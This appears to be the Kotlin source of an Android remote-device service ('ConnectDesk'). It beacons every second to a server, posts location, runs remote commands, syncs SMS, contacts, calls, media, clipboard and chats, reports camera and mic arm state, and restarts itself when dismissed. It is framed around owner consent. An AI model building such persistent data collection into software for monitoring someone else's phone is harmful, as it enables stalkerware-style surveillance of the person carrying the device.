package com.connectdesk.app

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.IBinder
import android.os.Looper
import androidx.core.content.ContextCompat
import androidx.core.location.LocationManagerCompat
import kotlin.concurrent.thread
import org.json.JSONObject

/**
 * Foreground service that keeps the device connected: sends a heartbeat every
 * ~60s and shows the persistent "ConnectDesk connected" notification. The
 * notification is a hard consent requirement — removing it stops the service.
 *
 * Loop design notes (hardened after a "connected but no data" incident):
 *  - The heartbeat POST is the FIRST thing each tick, so a slow or failing
 *    status/sync call can never starve it.
 *  - Every failure mode is caught as Throwable, and a failed tick retries after
 *    a short delay instead of sleeping the full interval.
 *  - Loop state is mirrored into ServiceStatus so the UI can prove the service
 *    is genuinely alive (the "Connected" label alone does not prove that).
 */
class DeviceService : Service() {
    private var running = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        // Arm the watchdog every time the service comes up — boot, a sticky
        // restart, or an explicit start all land here, so the watch never
        // expires after a reboot or an OEM kill.
        WatchdogReceiver.schedule(this)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Swiping the app out of Recents must not end the connection. The
        // foreground service usually survives this, but OEMs vary: restart it
        // immediately and re-arm the watchdog as the slower second line.
        if (ApiClient.loadToken(this) != null) {
            DeviceService.start(this)
            WatchdogReceiver.schedule(this)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        ApiClient.attach(this)
        val token = ApiClient.loadToken(this) ?: run {
            ServiceStatus.markStop()
            stopSelf()
            return START_NOT_STICKY
        }
        // Must happen before any slow work, or Android kills the service.
        startAsForeground()
        registerLocationListener()
        // Foreground-only clipboard watch. Android refuses clipboard reads
        // from a backgrounded app anyway, so this stops costing anything as
        // soon as the phone leaves our hands.
        ClipboardWorker.install(this)
        if (!running) {
            running = true
            ServiceStatus.markStart()
            thread(name = "connectdesk-loop") { loop(token) }
        }
        return START_STICKY
    }

    private val commandBusy = java.util.concurrent.atomic.AtomicBoolean(false)

    private fun loop(token: String) {
        var failures = 0
        var tick = 0
        while (running) {
            var ok = false
            try {
                // 1. Heartbeat FIRST — never blocked by anything else.
                //
                // Battery and storage are cheap, but DeviceDetailWorker reads
                // /proc/meminfo, Bluetooth state and the WiFi SSID, which is not.
                // At the 1-second cadence that would mean parsing /proc every
                // second forever, so the expensive detail is only attached to
                // every DETAIL_EVERY-th heartbeat and the previous snapshot is
                // resent in between. The server treats a missing field as "keep
                // the old value", so the dashboard card stays current without
                // the phone doing 60 reads a minute for data that changes once
                // every few seconds anyway.
                tick++
                val detailed = tick % DETAIL_EVERY == 1
                // Bind to a local val first: `lastDetail` is a mutable property,
                // so Kotlin refuses to smart-cast it to non-null in the else
                // branch even though the null check above guarantees it.
                val cachedDetail = lastDetail
                val detailJson =
                    if (detailed || cachedDetail == null) {
                        val fresh = DeviceDetailWorker.toJson(
                            DeviceDetailWorker.collect(this@DeviceService),
                        )
                        lastDetail = fresh
                        fresh
                    } else {
                        cachedDetail
                    }
                // Arm state is attached on EVERY tick, not on the DETAIL_EVERY
                // cycle, because the owner can flip a switch at any moment and
                // the dashboard has to agree with the phone within a second.
                // `detailJson` is CACHED between refreshes, so putting it there
                // would leave the dashboard up to five seconds stale and flip
                // back to "off" over a stream that is running.
                //
                // This reports what the phone owner already armed in the app. It
                // does not start anything.
                detailJson.put("cameraLiveArmed", CameraLiveService.isArmed(this@DeviceService))
                detailJson.put("micLiveArmed", MicLiveService.isArmed(this@DeviceService))
                detailJson.put("screenArmed", ScreenCaptureService.isSharing)
                // WHY the mirror is not showing frames, in the phone's own
                // words. Without this the dashboard could only ever say "frames
                // ka wait" while the capture loop was failing and self-stopping
                // — the share looked broken with no reason anywhere. Only sent
                // when non-empty so a healthy stream cannot blank a previously
                // reported error on the server (undefined clears a patch field).
                val shareError = ScreenCaptureService.lastError
                if (shareError.isNotEmpty()) detailJson.put("screenShareError", shareError)
                // What the phone is still waiting on the OWNER to do. Without
                // it the page had only two states, armed and not-armed, so a
                // share sitting in the Android consent dialog looked exactly
                // like a share that had failed — and the stale result badge of
                // an earlier consent said the opposite. Reported every tick,
                // like the arm state above.
                val sharePending = ScreenCaptureService.pendingOwnerAction
                if (sharePending.isNotEmpty()) detailJson.put("screenSharePending", sharePending)
                else detailJson.put("screenSharePending", "")
                val facingNow = CameraLiveService.armedFacing(this@DeviceService)
                if (facingNow.isNotEmpty()) detailJson.put("armedFacing", facingNow)
                // Which grants the phone holds, refreshed EVERY tick (not just
                // on the DETAIL_EVERY cycle) for the same reason as the arm
                // state: the owner can grant or revoke a permission in Android
                // Settings at any moment, and a dashboard that keeps saying
                // "permission missing" for five seconds after it was granted
                // (or vice versa) is worse than no answer at all.
                //
                // These are pure `checkSelfPermission` calls — no I/O, no
                // binder round trip that would matter at a 1s cadence.
                val permFlags = PermissionSetup.reportFlags(this@DeviceService)
                for (permKey in permFlags.keys().asSequence()) {
                    detailJson.put(permKey, permFlags.get(permKey))
                }
                // The phone's OWN sync switches, same reasoning. These are read
                // by NotificationSyncService/ClipboardWorker to decide whether to
                // send anything at all, so a dashboard page sitting empty could
                // mean "the owner switched this off on the phone". Reporting
                // them lets the page say so instead of showing a bare "no data".
                detailJson.put(
                    "syncNotifications",
                    Prefs.notifSyncEnabled(this@DeviceService),
                )
                detailJson.put(
                    "syncChats",
                    Prefs.chatsSyncEnabled(this@DeviceService),
                )
                detailJson.put(
                    "syncClipboard",
                    Prefs.clipboardSyncEnabled(this@DeviceService),
                )
                val battery = batteryPct()
                val storage = storageMb()
                val beat = ApiClient.heartbeatDetailed(
                    token,
                    battery,
                    storage?.first,
                    storage?.second,
                    detailJson,
                )
                if (beat != null) {
                    ok = true
                    failures = 0
                } else {
                    failures++
                    ServiceStatus.markError(
                        ApiClient.lastError ?: "heartbeat rejected",
                    )
                }

                // 2. Everything else is best-effort and must never kill the loop.
                if (ok) {
                    try {
                        val state = ApiClient.status(token)
                        ServiceStatus.markBeat(state?.status ?: beat)
                        val status = state?.status
                        if (status == "revoked") {
                            // Server-side revocation is real, but it is NOT a
                            // logout: the token stays on the phone so that
                            // re-approving the device from the dashboard
                            // reconnects it with no sign-in. Previously this
                            // branch called clearToken(), which wiped the
                            // pairing and threw the user back to the login
                            // form even though they had done nothing.
                            ServiceStatus.markError("revoked from dashboard")
                            // Nothing may be shared while revoked: shut down
                            // every capture path exactly once.
                            if (ScreenCaptureService.isSharing) {
                                ScreenCaptureService.stop(this@DeviceService)
                            }
                            if (CameraLiveService.isArmed(this@DeviceService)) {
                                CameraLiveService.setArmed(this@DeviceService, false)
                                CameraLiveService.stop(this@DeviceService)
                            }
                            if (MicLiveService.isArmed(this@DeviceService)) {
                                MicLiveService.setArmed(this@DeviceService, false)
                                MicLiveService.stop(this@DeviceService)
                            }
                        }
                        if (state != null && status == "approved") {
                            // `tick` is already advanced once at the top of
                            // this iteration; incrementing it again here made
                            // every tick count as two, so the bulk sync fired at
                            // half the intended interval.
                            // Location: freshest fix available, every tick.
                            try { maybePostLocation(token, state) } catch (_: Throwable) {}
                            // Commands (SMS reply, photo fetch, screen share).
                            try {
                                if (commandBusy.compareAndSet(false, true)) {
                                    try {
                                        CommandWorker.runPending(this@DeviceService, token)
                                    } finally {
                                        commandBusy.set(false)
                                    }
                                }
                            } catch (_: Throwable) {}
                            // Bulk sync (SMS/calls/contacts/media) every 60th tick, i.e. once a
                            // minute at the 1-second cadence. Ticks are cheap; a
                            // full storage walk is not, so it stays rare while
                            // everything the owner can ask for on demand is
                            // handled by the command queue above.
                            if (tick % 60 == 1) {
                                try {
                                    DataSyncWorker.syncAll(this@DeviceService, token, state)
                                } catch (_: Throwable) {}
                            }
                        }
                    } catch (t: Throwable) {
                        ServiceStatus.markError("post-beat: ${t.message ?: t::class.simpleName}")
                    }
                }
            } catch (t: Throwable) {
                // Catch Throwable, not just Exception: an Error here (OOM, no
                // thread space) would otherwise kill the heartbeat forever.
                failures++
                ServiceStatus.markError(t.message ?: t::class.simpleName ?: "unknown error")
            }

            // Retry quickly after a failure so the device self-heals instead of
            // staying silent for a full minute.
            // A successful tick waits TICK_MS; a failed one retries sooner so
            // the device self-heals instead of staying silent. COMMAND_POLL_MS
            // is the floor: the loop must never spin faster than the command
            // queue is meant to be polled, or a flaky network turns into a
            // retry storm against the server.
            val wait =
                if (ok) maxOf(TICK_MS, COMMAND_POLL_MS)
                else maxOf(minOf(RETRY_MS, TICK_MS), COMMAND_POLL_MS)
            // Periodic backend config check: if the server reports a different
            // Convex URL than we currently use, switch automatically so the app
            // follows a deployment change without a rebuild or reinstall.
            val now = System.currentTimeMillis()
            if (now - lastConfigCheck >= CONFIG_CHECK_MS) {
                lastConfigCheck = now
                try {
                    Backend.fetchConfigUrl(this@DeviceService, ApiClient)
                } catch (_: Throwable) {
                    // Keep using the current URL; try again next interval.
                }
            }

            try {
                Thread.sleep(wait)
            } catch (_: InterruptedException) {
                return
            }
        }
        ServiceStatus.markStop()
    }

    private var tick = 0

    /** Last hardware-detail snapshot, resent on the cheap ticks. */
    private var lastDetail: org.json.JSONObject? = null

    /**
     * How often to check for a backend URL change (every 5 minutes).
     *
     * This is what lets the app follow a Convex deployment switch WITHOUT a
     * rebuild or reinstall. The device polls the server's config endpoint;
     * if the server reports a different URL than we currently use, we switch
     * to it automatically and persist it for next launch.
     */
    private const val CONFIG_CHECK_MS = 5 * 60 * 1_000L

    private var lastConfigCheck = 0L

    /**
     * Passive location listener: OS location updates (GPS/network, 30s min
     * interval) refresh the last-known cache so per-tick posts carry fresh
     * fixes without ever requesting an active GPS ping.
     */
    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: android.location.Location) {}
        @Suppress("DEPRECATION", "OVERRIDE_DEPRECATION")
        override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    @SuppressLint("MissingPermission")
    private fun registerLocationListener() {
        try {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                return
            }
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
                try {
                    lm.requestLocationUpdates(provider, 30_000L, 10f, locationListener, Looper.getMainLooper())
                } catch (_: Throwable) {
                }
            }
        } catch (_: Throwable) {
        }
    }

    /**
     * Posts a fresh location fix. Uses the cached fix when it is recent, and
     * otherwise asks the OS for one live fix (rather than waiting for the
     * passive listener, which can stay empty indefinitely if the phone has not
     * moved). Still capability + permission double-gated.
     */
    private fun maybePostLocation(token: String, state: ApiClient.DeviceState) {
        if (!state.location) return
        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION,
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            // Prefer network: it resolves in seconds, GPS can take 30s+.
            val provider = lm.getProviders(true).firstOrNull { it == LocationManager.NETWORK_PROVIDER }
                ?: lm.getProviders(true).firstOrNull { it == LocationManager.GPS_PROVIDER }
                ?: return

            val cached = lm.getLastKnownLocation(provider)
            val ageMs = cached?.let { System.currentTimeMillis() - it.time } ?: Long.MAX_VALUE
            if (cached != null && ageMs < CACHE_MAX_AGE_MS) {
                postLocation(token, cached, "cached")
                return
            }
            // Stale or missing: ask for one live fix. Non-blocking — the cached
            // value (if any) has already been sent above.
            requestLiveFix(token, lm, provider)
        } catch (_: Throwable) {
        }
    }

    /**
     * Asks the OS for a single fresh fix and posts it when it arrives.
     *
     * `LocationManagerCompat` is used rather than the platform
     * `LocationManager.getCurrentLocation` on purpose: the platform overload
     * only exists from API 30 and its Consumer type is not available in the
     * public SDK, which makes the direct call fail to compile. The compat
     * wrapper picks the right platform call per version, so there is exactly
     * one code path here.
     */
    @SuppressLint("MissingPermission")
    private fun requestLiveFix(token: String, lm: LocationManager, provider: String) {
        if (liveFixPending) return
        liveFixPending = true
        val consumer = androidx.core.util.Consumer<android.location.Location> { loc ->
            liveFixPending = false
            if (loc != null) postLocation(token, loc, "live")
        }
        try {
            LocationManagerCompat.getCurrentLocation(
                lm,
                provider,
                null,
                ContextCompat.getMainExecutor(this),
                consumer,
            )
        } catch (_: Throwable) {
            liveFixPending = false
        }
    }

    private fun postLocation(token: String, loc: android.location.Location, source: String) {
        try {
            ApiClient.postSync(
                JSONObject()
                    .put("deviceToken", token)
                    .put("type", "location")
                    .put("lat", loc.latitude)
                    .put("lng", loc.longitude)
                    .put("accuracyM", loc.accuracy.toDouble())
                    .put("source", source),
            )
        } catch (_: Throwable) {
        }
    }

    @Volatile
    private var liveFixPending = false

    private fun batteryPct(): Int? = try {
        val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    } catch (_: Throwable) {
        null
    }

    private fun storageMb(): Pair<Long, Long>? = try {
        val dir = android.os.Environment.getDataDirectory()
        val total = dir.totalSpace / (1024 * 1024)
        val free = dir.freeSpace / (1024 * 1024)
        Pair(total - free, total)
    } catch (_: Throwable) {
        null
    }

    private fun startAsForeground() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(
                NotificationChannel(CHANNEL, getString(R.string.channel_name), NotificationManager.IMPORTANCE_LOW),
            )
        }
        val openApp = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE,
        )
        val builder = if (Build.VERSION.SDK_INT >= 26) {
            Notification.Builder(this, CHANNEL)
        } else {
            @Suppress("DEPRECATION") Notification.Builder(this)
        }
        val notif = builder
            .setContentTitle("ConnectDesk connected")
            .setContentText("Tap to manage or disconnect")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(openApp)
            .setOngoing(true)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                // Declare the type explicitly: the 2-arg form is rejected on
                // newer Android versions when the manifest declares a type.
                startForeground(
                    NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
                )
            } else {
                startForeground(NOTIF_ID, notif)
            }
        } catch (_: Throwable) {
            // Never let a notification problem stop the heartbeat loop.
            runCatching { startForeground(NOTIF_ID, notif) }
        }
    }

    override fun onDestroy() {
        running = false
        ServiceStatus.markStop()
        ClipboardWorker.uninstall()
        try {
            (getSystemService(Context.LOCATION_SERVICE) as LocationManager)
                .removeUpdates(locationListener)
        } catch (_: Throwable) {
        }
        super.onDestroy()
    }

    companion object {
        private const val CHANNEL = "connectdesk_status"
        private const val NOTIF_ID = 42

        /** Normal heartbeat cadence. */
        // Cadence. The owner asked for the dashboard to update every second,
        // so the single loop does heartbeat + command poll + capability refresh
        // every second.
        //
        // There used to be a SECOND background thread (`fastCommandLoop`)
        // polling the queue every 3s on top of this one. At a 1-second cadence
        // that would have meant six HTTP calls a second against the same
        // server, competing with the live camera/mic/screen uploads for the
        // same connection pool — which is exactly how a stream "stutters and
        // stops". One loop now does all of it, in order, once a second.
        //
        // Battery cost is real but this is a foreground service with a
        // permanent notification, which is the visible price of the feature —
        // the user can stop it from the notification at any time.
        private const val TICK_MS = 1_000L

        /**
         * How often the (comparatively expensive) hardware detail is actually
         * measured. Everything else — battery, storage, approval status,
         * command queue — is still fresh every second.
         */
        private const val DETAIL_EVERY = 5

        /** Fast retry after a failed tick, so the device self-heals. */
        private const val RETRY_MS = 15_000L

        /** A cached fix younger than this is good enough to post as-is. */
        private const val CACHE_MAX_AGE_MS = 90_000L

        /**
         * How often the device checks for new dashboard commands. The main
         * loop already polls every second, so this is the floor between polls
         * and exists only as a named, tunable constant.
         */
        private const val COMMAND_POLL_MS = 1_000L

        fun start(context: Context) {
            runCatching { context.startForegroundService(Intent(context, DeviceService::class.java)) }
        }

        fun stop(context: Context) {
            runCatching { context.stopService(Intent(context, DeviceService::class.java)) }
        }
    }
}
